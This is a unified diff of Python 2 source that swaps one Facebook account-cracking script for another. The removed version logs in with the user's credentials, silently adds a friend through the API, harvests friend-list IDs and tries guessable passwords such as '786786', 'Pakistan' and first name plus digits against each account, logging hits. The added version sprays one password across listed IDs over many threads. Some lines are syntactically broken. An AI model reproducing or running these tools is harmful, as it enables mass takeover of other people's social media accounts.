@@ -1,438 +1,327 @@
-#!/usr/bin/python2
-#coding=utf-8
-#The Credit For This Code Goes To MURSHAD FAMILY
-#If You Wanna Take Credits For This Code, Please Look Yourself Again...
-#Reserved2020
-
-
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-
-
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-
-
-def keluar():
-	print "\x1b[1;91mExit"
-	os.sys.exit()
-
-
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
-
-
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
-
-
-def jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.07)
-
-#Dev:Murshad Family
-##### LOGO #####
-logo = """
-\033[1;97m ❥▦▦▦▦M⃟▦▦▦▦▦▦❥▦❥▦▦▦▦▦❥▦❥▦▦▦▦▦▦N⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;97m ❥▦▦▦▦U⃟▦▦▦▦▦❥▦▦▦❥▦▦▦❥▦▦▦▦❥▦▦▦▦O⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;97m ❥▦▦▦▦R⃟▦▦▦▦❥▦▦▦▦▦❥▦❥▦▦▦▦▦▦❥▦▦▦R⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;97m ❥▦▦▦▦S⃟▦▦▦▦❥▦▦▦▦▦▦❥▦▦▦▦▦▦▦❥▦▦▦U⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;97m ❥▦▦▦▦H⃟▦▦▦▦❥▦▦▦▦▦▦▦▦▦▦▦▦▦❥▦▦▦▦L⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;93m ❥▦▦▦▦A⃟▦▦▦▦❥▦▦▦▦▦▦▦▦▦▦▦▦❥▦▦▦▦E⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;93m ❥▦▦▦▦D⃟▦▦▦▦▦▦❥▦▦▦▦▦▦▦▦▦❥▦▦▦▦▦S⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;93m ❥▦▦▦▦F⃟▦▦▦▦▦▦▦❥▦▦▦▦▦▦▦❥▦▦▦▦▦▦J⃟U⃟S⃟T⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;93m ❥▦▦▦▦A⃟▦▦▦▦▦▦▦▦❥▦▦▦▦▦❥▦▦▦▦▦▦▦D⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;93m ❥▦▦▦▦M⃟▦▦▦▦▦▦▦▦▦❥▦▦▦❥▦▦▦▦▦▦▦▦E⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;93m ❥▦▦▦▦L⃟▦▦▦▦▦▦▦▦▦▦❥▦❥▦▦▦▦▦▦▦▦▦A⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;93m ❥▦▦▦▦Y⃟▦▦▦▦▦▦▦▦▦▦❥▦▦▦▦▦▦▦▦▦▦▦D⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;93m ❥•❥•❥•❥•❥•❥•❥•❥• \033[1;97m●M⃟U⃟R⃟S⃟H⃟A⃟D⃟ F⃟A⃟M⃟I⃟L⃟Y⃟●\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"""
-
-def tik():
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-
-
-back = 0
-berhasil= []
-cekpoint = []
-oks = []
-id = []
-listgrup = []
-vulnot = "\033[31mNot Vuln"
-vuln = "\033[32mVuln"
-
-os.system("clear")
-print  """
- \033[1;97m ┏━┓┏━┓┏┓╋┏┓┏━━━┓┏━━━┓┏┓╋┏┓┏━━━┓┏━━━┓
- \033[1;97m ┃┃┗┛┃┃┃┃╋┃┃┃┏━┓┃┃┏━┓┃┃┃╋┃┃┃┏━┓┃┗┓┏┓┃
- \033[1;97m ┃┏┓┏┓┃┃┃╋┃┃┃┗━┛┃┃┗━━┓┃┗━┛┃┃┃╋┃┃╋┃┃┃┃
- \033[1;93m ┃┃┃┃┃┃┃┃╋┃┃┃┏┓┏┛┗━━┓┃┃┏━┓┃┃┗━┛┃╋┃┃┃┃
- \033[1;93m ┃┃┃┃┃┃┃┗━┛┃┃┃┃┗┓┃┗━┛┃┃┃╋┃┃┃┏━┓┃┏┛┗┛┃
- \033[1;93m ┗┛┗┛┗┛┗━━━┛┗┛┗━┛┗━━━┛┗┛╋┗┛┗┛╋┗┛┗━━━┛
- \033[1;93m ❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥••
- \033[1;93m ❥•❥•❥•❥•❥•❥•❥•❥•Welcm To Murshad Family❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;97m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;93mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  R⃟U⃟L⃟E⃟S⃟\033[1;97m❥•❥•❥•❥•❥•❥•❥•❥•
-\033[1;97mAuthor\033[1;97m    :❥•❥•❥•❥• \033[1;97m MURSHAD FAMILY
-\033[1;97mBMURSHAD FAMILY\033[1;97m:❥•❥•❥•❥• \033[1;97▒▓██████████████]99.9
-\033[1;93mFacebook\033[1;93m  :❥•❥•❥•❥• \033[1;93mAFTAB.HUSSAIN
-\033[1;93mWhatsapp\033[1;93m  :❥•❥•❥•❥• \033[1;93m+923131921102
-\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mMURSHAD.FAMILY\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"""
-jalan('\033[1;97m❥•❥•❥•❥•❥•❥•❥•❥•M⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟❥•❥•❥•❥•❥•❥•❥•❥•:')
-jalan("\033[1;97m ┏━┓┏━┓┏┓╋┏┓┏━━━┓┏━━━┓┏┓╋┏┓┏━━━┓┏━━━┓
-jalan('\033[1;97m ┃┃┗┛┃┃┃┃╋┃┃┃┏━┓┃┃┏━┓┃┃┃╋┃┃┃┏━┓┃┗┓┏┓┃
-jalan('\033[1;93m ┃┏┓┏┓┃┃┃╋┃┃┃┗━┛┃┃┗━━┓┃┗━┛┃┃┃╋┃┃╋┃┃┃┃
-jalan("\033[1;93m ┃┃┃┃┃┃┃┃╋┃┃┃┏┓┏┛┗━━┓┃┃┏━┓┃┃┗━┛┃╋┃┃┃┃
-jalan("\033[1;93m ┃┃┃┃┃┃┃┗━┛┃┃┃┃┗┓┃┗━┛┃┃┃╋┃┃┃┏━┓┃┏┛┗┛┃
-print "\033[1;93m ┗┛┗┛┗┛┗━━━┛┗┛┗━┛┗━━━┛┗┛╋┗┛┗┛╋┗┛┗━━━┛\033[1;97mLogin M⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m•❥•❥•❥•❥•❥•❥•❥•❥•"
-CorrectUsername = "MURSHAD"
-CorrectPassword = "GANG"
-
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;97m🔐 \x1b[1;93mTool Username \x1b[1;97m»» \x1b[1;93m")
-    if (username == CorrectUsername):
-    	password = raw_input("\033[1;97m🔐 \x1b[1;93mTool Password \x1b[1;97m»» \x1b[1;93m")
-        if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:MURSHAD-FAMILY
-	    time.sleep(2)
-            loop = 'false'
-        else:
-            print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.facebook.com/pankaj.panku.35
-    else:
-        print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.facebook.com/pankaj.panku.35
-
-def login():
-	os.system('clear')
-	try:
-		toket = open('login.txt','r')
-		menu() 
-	except (KeyError,IOError):
-		os.system('clear')
-		print logo
-		jalan(' \033[1;91mWarning: \033[1;93mTermux Old Version Install 0.63 to 0.83' )
-		jalan(' \033[1;91m   Note: \033[1;93mUse a New Account To Login' )
-		print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
-		print('	   \033[1;97m■\x1b[1;93m❥•❥•❥•❥••LOGIN WITH FACEBOOK❥•❥•❥•❥••\x1b[1;97m■' )
-		print('	' )
-		id = raw_input('\033[1;97m[+] \x1b[1;93mID/Email\x1b[1;97m: \x1b[1;93m')
-		pwd = raw_input('\033[1;97m[+] \x1b[1;93mPassword\x1b[1;97m: \x1b[1;93m')
-		tik()
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\x1b[1;96mThere is no internet connection"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\x1b[1;95mLogin Successful...'
-				os.system('xdg-open https://www.facebook.com/pankaj.panku.35
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;91mThere is no internet connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\x1b[1;91mYour Account is on Checkpoint")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			keluar()
-		else:
-			print("\n\x1b[1;93mPassword/Email is wrong")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			login()
-
-
-def menu():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		os.system('clear')
-		print"\x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		a = json.loads(otw.text)
-		nama = a['name']
-		id = a['id']
-	except KeyError:
-		os.system('clear')
-		print"\033[1;91mYour Account is on Checkpoint"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	except requests.exceptions.ConnectionError:
-		print"\x1b[1;97mThere is no internet connection"
-		keluar()
-	os.system("clear") #Dev:M⃟U⃟R⃟S⃟H⃟A⃟D⃟  G⃟A⃟N⃟G⃟
-	print logo
-	print "  \033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mLogged in User Info\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
-	print "	   \033[1;97m Name\033[1;93m:\033[1;93m"+nama+"\033[1;97m               "
-	print "	   \033[1;97m ID\033[1;93m  :\033[1;93m"+id+"\x1b[1;97m              "
-	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟S⃟H⃟A⃟D⃟ F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
-	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;93mStart Cloning..."
-	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
-	pilih()
-
-
-def pilih():
-	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
-	if unikers =="":
-		print "\x1b[1;91mFill in correctly"
-		pilih()
-	elif unikers =="1":
-		super()
-	elif unikers =="0":
-		jalan('Token Removed')
-		os.system('rm -rf login.txt')
-		keluar()
+import platform,os,sys
+def cetak(x,e=0):
+	w = 'mhkbpcP'
+	for i in w:
+		j = w.index(i)
+		x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+	x += '\033[0m'
+	x = x.replace('!0','\033[0m')
+	if e != 0:
+		sys.stdout.write(x)
 	else:
-		print "\x1b[1;91mFill in correctly"
-		pilih()
-
-
-def super():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	os.system('clear')
-	print logo
-	print "\033[1;97m--\033[1;97m> \033[1;93m1.\x1b[1;93mClone From Friend List..."
-	print "\033[1;97m--\033[1;97m> \033[1;93m2.\x1b[1;93mClone From Public ID..."
-	print "\033[1;97m--\033[1;97m> \033[1;97m0.\033[1;97mBack"
-	pilih_super()
-
-def pilih_super():
-	peak = raw_input("\n\033[1;93mChoose an Option>>> \033[1;97m")
-	if peak =="":
-		print "\x1b[1;91mFill in correctly"
-		pilih_super()
-	elif peak =="1":
-		os.system('clear')
-		print logo
-		print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
-		jalan('\033[1;97mGetting IDs \033[1;93m...')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for s in z['data']:
-			id.append(s['id'])
-	elif peak =="2":
-		os.system('clear')
-		print logo
-		idt = raw_input("\033[1;93m[♡] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
-		print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟D⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
+		sys.stdout.write(x+'\n')
+if platform.python_version().split('.')[0] != '2':
+	cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
+	sys.exit()
+import cookielib,re,urllib2,urllib,threading
+try:
+  import mechanize
+except ImportError:
+	cetak('!m[!] SepertiNya Module !cmechanize!m belum di install...\n!h[!] pip2 install mechanize')
+	sys.exit()
+br = 0
+log = 0
+id_bteman = []
+id_bgroup = []
+fid_bteman = []
+fid_bgroup = []
+class mt(threading.Thread):
+	def __init__(self,i,p):
+		threading.Thread.__init__(self)
+		self.id = i
+		self.a = 0
+		self.p = p
+	def update(self):
+		return self.a,self.id
+	def run(self):
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
-		except KeyError:
-			print"\x1b[1;93mID Not Found!"
-			raw_input("\n\033[1;97m[\033[1;91mM⃟U⃟R⃟S⃟H⃟A⃟D⃟\033[1;97m]")
-			super()
-		print"\033[1;93mGetting IDs\033[1;93m..."
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
-	elif peak =="0":
-		menu()
-	else:
-		print "\x1b[1;97mFill in correctly"
-		pilih_super()
-	
-	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
-	jalan('\033[1;93mPlease Wait\033[1;93m...')
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;97m«-----\x1b[1;93m■To Stop Process Press CTRL+Z■\033[1;97m----»"
-	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;93mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
-	jalan(' \033[1;97m ❥•❥•❥•❥•❥•❥•❥•❥•Cloning Start plzzz Wait❥•❥•❥•❥•❥•❥•❥•❥• ')
-	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
-	
-			
-	def main(arg):
-		global cekpoint,oks
-		user = arg
-		try:
-			os.mkdir('out')
-		except OSError:
-			pass #Dev:MURSHAD GANG
-		try:
-			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-			b = json.loads(a.text)
-			pass1 = ('786786')
-			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			q = json.load(data)
-			if 'access_token' in q:
-				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
-				oks.append(user+pass1)
-			else:
-				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
-					cek = open("out/checkpoint.txt", "a")
-					cek.write(user+"|"+pass1+"\n")
-					cek.close()
-					cekpoint.append(user+pass1)
-				else:
-					pass2 = ('Pakistan')
-					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-					q = json.load(data)
-					if 'access_token' in q:
-						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
-						oks.append(user+pass2)
-					else:
-						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
-							cek = open("out/checkpoint.txt", "a")
-							cek.write(user+"|"+pass2+"\n")
-							cek.close()
-							cekpoint.append(user+pass2)
-						else:
-							pass3 = a['first_name'] + '786'
-							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-							q = json.load(data)
-							if 'access_token' in q:
-								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
-								oks.append(user+pass3)
-							else:
-								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
-									cek = open("out/checkpoint.txt", "a")
-									cek.write(user+"|"+pass3+"\n")
-									cek.close()
-									cekpoint.append(user+pass3)
-								else:
-									pass4 = b['first_name'] + '12345'
-									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-									q = json.load(data)
-									if 'access_token' in q:
-										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
-										oks.append(user+pass4)
-									else:
-										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
-											cek = open("out/checkpoint.txt", "a")
-											cek.write(user+"|"+pass4+"\n")
-											cek.close()
-											cekpoint.append(user+pass4)
-										else:
-											pass5 = b['first_name'] + '1234'
-											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-											q = json.load(data)
-											if 'access_token' in q:
-												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
-												oks.append(user+pass5)
-											else:
-												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
-													cek = open("out/checkpoint.txt", "a")
-													cek.write(user+"|"+pass5+"\n")
-													cek.close()
-													cekpoint.append(user+pass5)
-												else:
-													pass6 = b['first_name'] + '123'
-													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-													q = json.load(data)
-													if 'access_token' in q:
-														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
-														oks.append(user+pass6)
-													else:
-														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
-															cek = open("out/checkpoint.txt", "a")
-															cek.write(user+"|"+pass6+"\n")
-															cek.close()
-															cekpoint.append(user+pass6)
-														else:
-															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-															b = json.loads(a.text)
-															pass7 = b['first_name'] + '786'
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-															q = json.load(data)
-															if 'access_token' in q:
-																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
-																oks.append(user+pass7)
-															else:
-																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
-																	cek = open("out/checkpoint.txt", "a")
-																	cek.write(user+"|"+pass7+"\n")
-																	cek.close()
-																	cekpoint.append(user+pass7)
-																	
-															
+			data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
+		except KeyboardInterrupt:
+			sys.exit()
 		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
-	print "  \033[1;93m«❥•❥•❥•❥•Developed By AFTAB❥•❥•❥•❥•»" #Dev:MURSHAD GANG
-	print '\033[1;93mProcess Has Been Completed\033[1;97m....'
-	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print """
-             
-             ...........███ ]▄▄▄▄▄▃❥•❥•❥•❥•
-             ..▂▄▅█████▅▄▃▂
-             [███████████████]
-             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
-••••••••••••••❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•••••••••••.
-: \033[1;97m ❥•❥•❥•❥•MURSHAD  FAMILY RULES❥•❥•❥•❥• \033[1;93m :
-••••••••••••••❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•••••••••••.' 
-                whatsapp Num
-               +923131921102"""
-	
-	raw_input("\n\033[1;93m[\033[1;91mM⃟U⃟R⃟S⃟H⃟A⃟D⃟\033[1;93m]")
-	menu()
-
-if __name__ == '__main__':
-	login()
+			self.a = 4
+			sys.exit()
+		if 'm_sess' in data.url or 'save-device' in data.url:
+			self.a = 1
+		elif 'checkpoint' in data.url:
+			self.a = 2
+		else:
+			self.a = 3
+def crack(d):
+	while 1:
+		s = inputD('[?] Sandi')
+		if len(s) < 6:
+			cetak('!m[!] Jumlah huruf minimal !k6')
+		else:
+			break
+	return crack0(d,s)
+def tampilhasil(akun,sandi,data):
+	cekpoint = []
+	salah = 0
+	berhasil = []
+	for i in akun:
+		st,id = i
+		if st == 1:
+			berhasil.append(id)
+		elif st == 2:
+			cekpoint.append(id)
+		elif st == 3:
+			salah += 1
+	cetak('!h[*] Berhasil !c%d'%len(berhasil))
+	if len(berhasil) != 0:
+		for i in berhasil:
+			cetak('!h### !p%s !m=> !b[!k%s!b]'%(i,sandi))
+	cetak('!k[*] Cekpoint !c%d'%len(cekpoint))
+	if len(cekpoint) != 0:
+		for i in cekpoint:
+			cetak('!k### !p%s !m=> !b[!k%s!b]'%(i,sandi))
+	cetak('!m[*] Gagal    !c'+str(salah))
+	i = inputD('[?] Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
+	if i.upper() == 'Y':
+		return crack(data)
+	else:
+		return menu()
+def crack0(data,sandi):
+	akun = []
+	cetak('!h[*] MengCrack !k%d Akun !hdengan sandi !m[!k%s!m]'%(len(data),sandi))
+	cetak('!h[*] Cracking  !k0!m%',1)
+	sys.stdout.flush()
+	jml0,jml1 = 0,0
+	th = []
+	for i in data:
+		i = i.replace(' ','')
+		i = i.replace('\n','')
+		if len(i) != 0:th.append(mt(i,sandi))
+		jml1 += 1
+	for i in th:
+		i.daemon = True
+		try:i.start()
+		except KeyboardInterrupt:exit()
+	h_error = []
+	error = 0
+	while 1:
+		try:
+			for i in th:
+				status,id = i.update()
+				if status != 0:
+					cetak('\r!h[*] Cracking  !k%d!m%s!0'%(int(float((float(jml0)/float(jml1))*100)),'%'),1)
+					sys.stdout.flush()
+					del(th[th.index(i)])
+					if status == 4:
+						h_error.append(id)
+						if h_error.count(id) == 3:
+							pass
+						else:
+							th.append(mt(id,sandi))
+							th[len(th)-1].daemon = True
+							th[len(th)-1].start()
+					else:
+						jml0 += 1
+						akun.append((status,id))
+		except KeyboardInterrupt:
+			sys.exit()
+		try:
+			if threading.activeCount() == 1:break
+		except KeyboardInterrupt:
+			keluar()
+	cetak('\r!h[*] Cracking  !k100!m%      ')
+	tampilhasil(akun,sandi,data)
+def install_browser():
+	global br
+	br = mechanize.Browser()
+	br.set_handle_robots(False)
+	br.set_handle_equiv(True)
+	br.set_handle_referer(True)
+	br.set_cookiejar(cookielib.LWPCookieJar())
+	br.set_handle_redirect(True)
+	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+	br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+def bacaData():
+	global fid_bgroup,fid_bteman
+	try:
+		fid_bgroup = open(os.sys.path[0]+'/MBFgroup.txt','r').readlines()
+	except:pass
+	try:
+		fid_bteman = open(os.sys.path[0]+'/MBFteman.txt','r').readlines()
+	except:pass
+def simpan():
+	if len(id_bgroup) != 0:
+		cetak('!h[*] Menyimpan hasil dari Group')
+		try:
+			open(os.sys.path[0]+'/MBFgroup.txt','w').write('\n'.join(id_bgroup))
